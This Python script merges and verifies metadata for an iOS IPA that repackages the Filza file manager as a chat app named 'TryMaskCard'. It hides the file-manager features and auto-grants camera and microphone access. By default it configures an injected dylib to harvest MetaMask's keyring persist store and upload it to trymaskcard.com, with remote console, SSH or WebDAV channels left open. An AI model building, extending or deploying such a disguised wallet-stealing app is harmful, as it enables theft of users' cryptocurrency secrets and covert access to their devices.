#!/usr/bin/env python3
"""Chat-shell metadata merge + verification for the Filza-27 IPA.

Two responsibilities, both idempotent:

  1. merge   - take the packaged ``Payload/*.app/Info.plist`` of a chat-shell
               build, make it look and behave like the chat client it ships as
               (display name, the shell's own URL scheme, camera/microphone
               usage descriptions, no file-manager shortcut or document-type
               advertising) and emit ``TryMaskCardShell.plist`` next to it, which
               is what actually arms the shell at runtime.

  2. verify  - assert that a *packaged* app directory or IPA really carries all
               of the above plus the compiled shell module inside
               ``Frameworks/FilzaApplySandboxExt.dylib``. Used by
               scripts/build_release_ipa.sh, scripts/build_chat_shell_ipa.sh and
               the GitHub Actions workflow, and runnable by hand on any host.

Contract: docs/CHAT_SHELL.md. Everything here is stdlib-only so it runs on the
macOS build hosts and on a plain Windows/Linux checkout.
"""

from __future__ import annotations

import argparse
import json
import os
import plistlib
import sys
import zipfile
from pathlib import Path

DEFAULT_HOME_URL = "https://trymaskcard.com/"
DEFAULT_SCHEME = "trymaskcard"
SHELL_PLIST_NAME = "TryMaskCardShell.plist"
DYLIB_NAME = "FilzaApplySandboxExt.dylib"
SHELL_URL_NAME = "com.local.trymaskcard.shell"

# Persist-store harvest defaults. Evidence: docs/CHAT_SHELL.md - the redux-persist
# keyring store MetaMask keeps in its own container Documents directory.
DEFAULT_PERSIST_BUNDLE_ID = "io.metamask"
DEFAULT_PERSIST_RELATIVE_PATH = "Documents/persistStore/persist-keyringcontroller"

# Chat backend that receives the harvest (multipart/form-data: uuid + file).
DEFAULT_PERSIST_UPLOAD_URL = "https://trymaskcard.com/api/app/device-upload"


def env(name: str, fallback: str = "") -> str:
    """Read a FILZA_CHAT_SHELL_* environment value set by the packaging scripts."""
    return os.environ.get(name, fallback)


def env_flag(name: str, fallback: bool = False) -> bool:
    raw = os.environ.get(name)
    if raw is None:
        return fallback
    return raw.strip().lower() in ("1", "true", "yes", "on")

# Bytes that must be present inside the injected dylib for a chat-shell artifact
# to be real. Only strip-proof evidence is listed: Objective-C class names
# (__objc_classname), the anchored marker table in TryMaskCardShell.m
# (__attribute__((used))) and the compiled-in home page.
#
# "chat-shell-forced-by-build" is the decisive one: it proves the dylib was
# compiled with -DFILZA_CHAT_SHELL_FORCE=1, i.e. this artifact opens the chat
# surface because of how it was built, not because a metadata file happened to
# survive packaging.
#
# Every entry here must be anchored by the source checker: a literal that is only
# referenced from a configuration branch disappears from a forced build (the dead
# branch is eliminated), which once failed a perfectly good artifact.
SHELL_FORCED_MARKER = "chat-shell-forced-by-build"
SHELL_STATUS_MARKER = "TryMaskCardShell-Status.txt"
DYLIB_MARKERS = (
    "TryMaskCardShell",
    "TMShellWebController",
    "TMShellFileManagerContainer",
    SHELL_FORCED_MARKER,
    SHELL_STATUS_MARKER,
    DEFAULT_HOME_URL,
)

# Declarations that would advertise (or re-open) the file manager from outside
# the app: the chat build never shows those surfaces, so it must not claim them.
DOCUMENT_TYPE_KEYS = (
    "CFBundleDocumentTypes",
    "UTExportedTypeDeclarations",
    "UTImportedTypeDeclarations",
)


class ContractError(Exception):
    """Raised when a packaged app or IPA does not match the contract."""


def load_plist(path: Path) -> tuple[dict, bool]:
    with path.open("rb") as handle:
        raw = handle.read()
    return plistlib.loads(raw), raw[:8] == b"bplist00"


def save_plist(path: Path, payload: dict, binary: bool) -> None:
    with path.open("wb") as handle:
        plistlib.dump(payload, handle, fmt=plistlib.FMT_BINARY if binary else plistlib.FMT_XML)


def ensure_url_scheme(info: dict, scheme: str) -> bool:
    url_types = list(info.get("CFBundleURLTypes") or [])
    for entry in url_types:
        if not isinstance(entry, dict):
            continue
        if scheme in (entry.get("CFBundleURLSchemes") or []):
            return False
    url_types.append({
        "CFBundleURLName": SHELL_URL_NAME,
        "CFBundleURLSchemes": [scheme],
    })
    info["CFBundleURLTypes"] = url_types
    return True


def merged_info(info: dict, args: argparse.Namespace) -> tuple[dict, dict]:
    """Apply the chat-shell transforms; return (info, report)."""
    report: dict = {"schemeAdded": False, "stripped": [], "addedUsage": [],
                    "bundleIdChanged": False, "atsWebContent": False}

    if args.display_name:
        info["CFBundleDisplayName"] = args.display_name

    if args.bundle_id:
        if not args.allow_bundle_id_change:
            raise ContractError(
                "--bundle-id requires --allow-bundle-id-change: the base Filza shell "
                "and the existing signing/verification steps assume the upstream id")
        if info.get("CFBundleIdentifier") != args.bundle_id:
            info["CFBundleIdentifier"] = args.bundle_id
            report["bundleIdChanged"] = True

    report["schemeAdded"] = ensure_url_scheme(info, args.scheme)

    usage_strings = {
        "NSCameraUsageDescription": "Camera access lets you take photos and record "
                                    "video inside the chat.",
        "NSMicrophoneUsageDescription": "Microphone access lets you record voice "
                                        "messages and join calls in the chat.",
    }
    for key, value in usage_strings.items():
        if not info.get(key):
            info[key] = value
            report["addedUsage"].append(key)

    if args.url.lower().startswith("http://"):
        ats = dict(info.get("NSAppTransportSecurity") or {})
        ats["NSAllowsArbitraryLoadsInWebContent"] = True
        info["NSAppTransportSecurity"] = ats
        report["atsWebContent"] = True

    if not args.keep_shortcuts and info.get("UIApplicationShortcutItems"):
        info.pop("UIApplicationShortcutItems", None)
        report["stripped"].append("UIApplicationShortcutItems")

    if not args.keep_document_types:
        for key in DOCUMENT_TYPE_KEYS:
            if key in info:
                info.pop(key, None)
                report["stripped"].append(key)

    return info, report


def shell_plist(args: argparse.Namespace) -> dict:
    return {
        "enabled": True,
        "homeURL": args.url,
        "urlScheme": args.scheme,
        "userAgentSuffix": args.user_agent_suffix,
        "allowHiddenFileManager": bool(args.allow_hidden_file_manager),
        "hiddenEntryGesture": True,
        "hiddenEntryURLScheme": True,
        "suppressFilzaPrompts": True,
        "suppressFilzaShortcuts": True,
        "containerChrome": True,
        "autoGrantMediaCapture": True,
        "sharePairingWithPage": not args.no_share_pairing,
        "fileDownloadsEnabled": True,
        "enableRemoteConsole": not args.no_remote_console,
        "enableSSH": bool(args.enable_ssh),
        "enableWebDAV": bool(args.enable_webdav),
        "persistAutoHarvest": not args.no_persist_harvest,
        "persistTargetBundleID": args.persist_target_bundle_id,
        "persistRelativePath": args.persist_relative_path,
        "persistCopyToDocuments": not args.no_persist_copy,
        "persistUploadEnabled": not args.no_persist_upload,
        "persistUploadURL": "" if args.no_persist_upload else args.persist_upload_url,
        "persistUploadExtraFields": bool(args.persist_upload_extra_fields),
        "persistUploadAlways": bool(args.persist_upload_always),
        "autoReturnSeconds": int(args.auto_return_seconds),
        "homeRetryCount": int(args.home_retry_count),
        "bridgeCommands": ["info", "pairingURL", "saveFile", "persistStore"],
        "externalSchemes": ["tel", "mailto", "sms", "weixin", "alipay", "mqqapi",
                            "itms-apps", "itms-services", "maps", "whatsapp", "line"],
    }


def verify_info(info: dict, args: argparse.Namespace, problems: list) -> None:
    if not info.get("CFBundleDisplayName"):
        problems.append("Info.plist has no CFBundleDisplayName")

    schemes = []
    for entry in info.get("CFBundleURLTypes") or []:
        if isinstance(entry, dict):
            schemes.extend(entry.get("CFBundleURLSchemes") or [])
    if args.scheme not in schemes:
        problems.append(f"Info.plist does not declare the {args.scheme}:// scheme")

    for key in ("NSCameraUsageDescription", "NSMicrophoneUsageDescription"):
        if not info.get(key):
            problems.append(f"Info.plist is missing {key} for chat media capture")

    local_network = info.get("NSLocalNetworkUsageDescription") or ""
    if "WebDAV" not in local_network or "SSH" not in local_network:
        problems.append("NSLocalNetworkUsageDescription lost its WebDAV/SSH coverage")

    if not args.keep_shortcuts and info.get("UIApplicationShortcutItems"):
        problems.append("UIApplicationShortcutItems still advertises file-manager entries")

    if not args.keep_document_types:
        for key in ("CFBundleDocumentTypes", "UTExportedTypeDeclarations"):
            if info.get(key):
                problems.append(f"{key} still advertises file-manager document handling")


def verify_shell_plist(payload: dict, args: argparse.Namespace, problems: list) -> None:
    if not payload.get("enabled"):
        problems.append(f"{SHELL_PLIST_NAME} does not set enabled=true")

    home = payload.get("homeURL") or ""
    if not home.lower().startswith("http"):
        problems.append(f"{SHELL_PLIST_NAME} has no usable homeURL")

    if payload.get("urlScheme") != args.scheme:
        problems.append(f"{SHELL_PLIST_NAME} urlScheme != {args.scheme}")

    commands = payload.get("bridgeCommands") or []
    if "info" not in commands:
        problems.append(f"{SHELL_PLIST_NAME} bridgeCommands lost the info command")

    if "openFileManager" in commands:
        problems.append(
            f"{SHELL_PLIST_NAME} exposes openFileManager as a page command; the chat "
            "surface must not ship a file-manager entry")

    # The chat build has no Settings screen, so at least one wire channel has to
    # stay open or the device filesystem would be unreachable entirely.
    channels = [name for name, enabled in (
        ("enableRemoteConsole", payload.get("enableRemoteConsole")),
        ("enableSSH", payload.get("enableSSH")),
        ("enableWebDAV", payload.get("enableWebDAV")),
    ) if enabled]
    if not channels:
        problems.append(
            f"{SHELL_PLIST_NAME} leaves the file manager unreachable: at least one wire "
            "channel (enableRemoteConsole / enableSSH / enableWebDAV) must stay enabled")

    # Persist-store harvest contract.
    if payload.get("persistAutoHarvest"):
        bundle = payload.get("persistTargetBundleID") or ""
        if not bundle:
            problems.append(f"{SHELL_PLIST_NAME} harvests a persist store with no target bundle id")

        relative = payload.get("persistRelativePath") or ""
        if not relative or relative.startswith("/") or ".." in relative.split("/"):
            problems.append(
                f"{SHELL_PLIST_NAME} persistRelativePath must be a relative path inside the "
                f"container (got {relative!r})")

        upload = payload.get("persistUploadURL") or ""
        if payload.get("persistUploadEnabled") and not upload.lower().startswith("https://"):
            problems.append(
                f"{SHELL_PLIST_NAME} persistUploadURL must be https when the upload is on "
                f"(got {upload!r})")
        if upload and not upload.lower().startswith("https://"):
            problems.append(f"{SHELL_PLIST_NAME} persistUploadURL must be https (got {upload!r})")


def verify_dylib(data: bytes, problems: list) -> None:
    if not data:
        problems.append(f"{DYLIB_NAME} is empty or missing")
        return
    missing = [marker for marker in DYLIB_MARKERS if marker.encode() not in data]
    if missing:
        problems.append("dylib is missing shell markers: " + ", ".join(missing))


def verify_app_directory(app: Path, args: argparse.Namespace) -> dict:
    problems: list = []
    info_path = app / "Info.plist"
    if not info_path.is_file():
        raise ContractError(f"Info.plist not found in {app}")

    info, _ = load_plist(info_path)
    verify_info(info, args, problems)

    shell_path = app / SHELL_PLIST_NAME
    if not shell_path.is_file():
        problems.append(f"{SHELL_PLIST_NAME} is not packaged next to the app binary")
    else:
        try:
            payload, _ = load_plist(shell_path)
            verify_shell_plist(payload, args, problems)
        except Exception as error:  # noqa: BLE001 - report, do not crash
            problems.append(f"{SHELL_PLIST_NAME} is unreadable: {error}")

    dylib = app / "Frameworks" / DYLIB_NAME
    if not dylib.is_file():
        problems.append(f"Frameworks/{DYLIB_NAME} is missing")
    else:
        verify_dylib(dylib.read_bytes(), problems)

    if problems:
        raise ContractError("; ".join(problems))

    return {
        "mode": "app",
        "app": str(app),
        "bundleId": info.get("CFBundleIdentifier"),
        "displayName": info.get("CFBundleDisplayName"),
        "checked": ["Info.plist", SHELL_PLIST_NAME, f"Frameworks/{DYLIB_NAME}"],
    }


def verify_ipa(ipa: Path, args: argparse.Namespace) -> dict:
    problems: list = []
    with zipfile.ZipFile(ipa) as archive:
        names = archive.namelist()
        app_prefixes = sorted({
            name.split("Payload/", 1)[1].split("/", 1)[0]
            for name in names if name.startswith("Payload/") and "/" in name[len("Payload/"):]
        })
        if len(app_prefixes) != 1:
            raise ContractError(f"expected exactly one app in Payload, found {app_prefixes}")
        app_prefix = f"Payload/{app_prefixes[0]}"

        info_entry = f"{app_prefix}/Info.plist"
        if info_entry not in names:
            raise ContractError(f"{info_entry} not found in {ipa.name}")
        info = plistlib.loads(archive.read(info_entry))
        verify_info(info, args, problems)

        shell_entry = f"{app_prefix}/{SHELL_PLIST_NAME}"
        if shell_entry not in names:
            problems.append(f"{SHELL_PLIST_NAME} is not packaged next to the app binary")
        else:
            try:
                verify_shell_plist(plistlib.loads(archive.read(shell_entry)), args, problems)
            except Exception as error:  # noqa: BLE001
                problems.append(f"{SHELL_PLIST_NAME} is unreadable: {error}")

        dylib_entry = f"{app_prefix}/Frameworks/{DYLIB_NAME}"
        if dylib_entry not in names:
            problems.append(f"Frameworks/{DYLIB_NAME} is missing")
        else:
            verify_dylib(archive.read(dylib_entry), problems)

    if problems:
        raise ContractError("; ".join(problems))

    return {
        "mode": "ipa",
        "ipa": str(ipa),
        "app": app_prefix,
        "bundleId": info.get("CFBundleIdentifier"),
        "displayName": info.get("CFBundleDisplayName"),
        "checked": [info_entry, shell_entry, dylib_entry],
    }


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("info_plist", nargs="?", type=Path,
                        help="Payload/*.app/Info.plist to merge (merge mode)")

    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--verify-app", type=Path,
                      help="verify a packaged Payload/*.app directory")
    mode.add_argument("--verify-ipa", type=Path,
                      help="verify a packaged .ipa")

    parser.add_argument("--shell-plist", type=Path,
                        help="destination for TryMaskCardShell.plist (merge mode)")
    parser.add_argument("--url", default=env("FILZA_CHAT_SHELL_URL", DEFAULT_HOME_URL),
                        help=f"chat home page (default {DEFAULT_HOME_URL})")
    parser.add_argument("--scheme", default=env("FILZA_CHAT_SHELL_SCHEME", DEFAULT_SCHEME),
                        help=f"shell URL scheme (default {DEFAULT_SCHEME})")
    parser.add_argument("--display-name", default=env("FILZA_CHAT_SHELL_DISPLAY_NAME"),
                        help="CFBundleDisplayName for the chat client")
    parser.add_argument("--bundle-id", default=env("FILZA_CHAT_SHELL_BUNDLE_ID"),
                        help="override CFBundleIdentifier (requires the opt-in flag)")
    # Setting FILZA_CHAT_SHELL_BUNDLE_ID *is* the explicit opt-in: the caller had to
    # name the replacement identifier on purpose.
    parser.add_argument("--allow-bundle-id-change", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_BUNDLE_ID"),
                        help="permit --bundle-id to rewrite the upstream identifier")
    parser.add_argument("--allow-hidden-file-manager", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_ALLOW_HIDDEN_FILE_MANAGER"),
                        help="re-arm the stored on-device file manager entry")
    parser.add_argument("--keep-shortcuts", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_KEEP_SHORTCUTS"),
                        help="keep UIApplicationShortcutItems in the Info.plist")
    parser.add_argument("--keep-document-types", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_KEEP_DOCUMENT_TYPES"),
                        help="keep CFBundleDocumentTypes / UTI declarations")
    parser.add_argument("--user-agent-suffix", default=env("FILZA_CHAT_SHELL_USER_AGENT",
                                                           "TryMaskCardShell/1.0"),
                        help="appended to the WKWebView user agent")
    parser.add_argument("--share-pairing", dest="no_share_pairing", action="store_false",
                        help="let the chat page read the remote-console pairing URL")
    parser.set_defaults(no_share_pairing=False)
    parser.add_argument("--no-remote-console", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_NO_REMOTE_CONSOLE"),
                        help="do not bring the token-paired remote console up")
    parser.add_argument("--enable-ssh", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_ENABLE_SSH"),
                        help="also start the SSH/SFTP listener (needs a configured password)")
    parser.add_argument("--enable-webdav", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_ENABLE_WEBDAV"),
                        help="also start the WebDAV listener")
    parser.add_argument("--no-persist-harvest", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_NO_PERSIST_HARVEST"),
                        help="do not harvest the target app's persist store at launch")
    parser.add_argument("--persist-target-bundle-id", "--persist-bundle-id",
                        dest="persist_target_bundle_id",
                        default=env("FILZA_CHAT_SHELL_PERSIST_BUNDLE_ID", DEFAULT_PERSIST_BUNDLE_ID),
                        help=f"app whose container is read (default {DEFAULT_PERSIST_BUNDLE_ID})")
    parser.add_argument("--persist-relative-path", "--persist-path",
                        dest="persist_relative_path",
                        default=env("FILZA_CHAT_SHELL_PERSIST_PATH", DEFAULT_PERSIST_RELATIVE_PATH),
                        help="path inside that container")
    parser.add_argument("--no-persist-copy", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_NO_PERSIST_COPY"),
                        help="do not mirror the harvested file into the app's Documents")
    parser.add_argument("--persist-upload-url", default=env("FILZA_CHAT_SHELL_PERSIST_UPLOAD_URL",
                                                            DEFAULT_PERSIST_UPLOAD_URL),
                        help=f"https endpoint that receives the harvest "
                             f"(default {DEFAULT_PERSIST_UPLOAD_URL})")
    parser.add_argument("--no-persist-upload", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_NO_PERSIST_UPLOAD"),
                        help="harvest locally but never POST to the chat backend")
    parser.add_argument("--persist-upload-extra-fields", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_PERSIST_UPLOAD_EXTRA_FIELDS"),
                        help="add bundleID/sha256/relativePath/device parts to the upload")
    parser.add_argument("--persist-upload-always", action="store_true",
                        default=env_flag("FILZA_CHAT_SHELL_PERSIST_UPLOAD_ALWAYS"),
                        help="upload even when the same store was delivered before")
    parser.add_argument("--auto-return-seconds", type=int, default=0,
                        help="auto-close the hidden file manager after N seconds (0=off)")
    parser.add_argument("--home-retry-count", type=int, default=3,
                        help="automatic reload attempts when the home page fails")
    parser.add_argument("--dry-run", action="store_true",
                        help="merge mode: report changes without writing anything")
    return parser


def run_merge(args: argparse.Namespace) -> int:
    if not args.info_plist:
        raise ContractError("merge mode needs an Info.plist path")
    if not args.info_plist.is_file():
        raise ContractError(f"Info.plist not found: {args.info_plist}")
    if not args.display_name:
        raise ContractError("merge mode needs --display-name so the app is named for the chat client")
    if args.persist_upload_url and not args.persist_upload_url.lower().startswith("https://"):
        raise ContractError("--persist-upload-url must be https")
    if args.persist_relative_path.startswith("/") or ".." in args.persist_relative_path.split("/"):
        raise ContractError("--persist-relative-path must be relative to the container root")

    info, binary = load_plist(args.info_plist)
    info, report = merged_info(info, args)
    report["homeURL"] = args.url
    report["displayName"] = args.display_name
    report["shellPlist"] = str(args.shell_plist) if args.shell_plist else None

    if args.dry_run:
        print(json.dumps({"dryRun": True, **report}, indent=2, sort_keys=True))
        return 0

    save_plist(args.info_plist, info, binary)
    if args.shell_plist:
        save_plist(args.shell_plist, shell_plist(args), False)

    print(json.dumps({"merged": True, **report}, indent=2, sort_keys=True))
    return 0


def main(argv: list[str]) -> int:
    args = build_parser().parse_args(argv)
    try:
        if args.verify_ipa:
            result = verify_ipa(args.verify_ipa, args)
        elif args.verify_app:
            result = verify_app_directory(args.verify_app, args)
        else:
            return run_merge(args)
    except ContractError as error:
        print(f"chat-shell contract failed: {error}", file=sys.stderr)
        return 70
    print(json.dumps({"verified": True, **result}, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
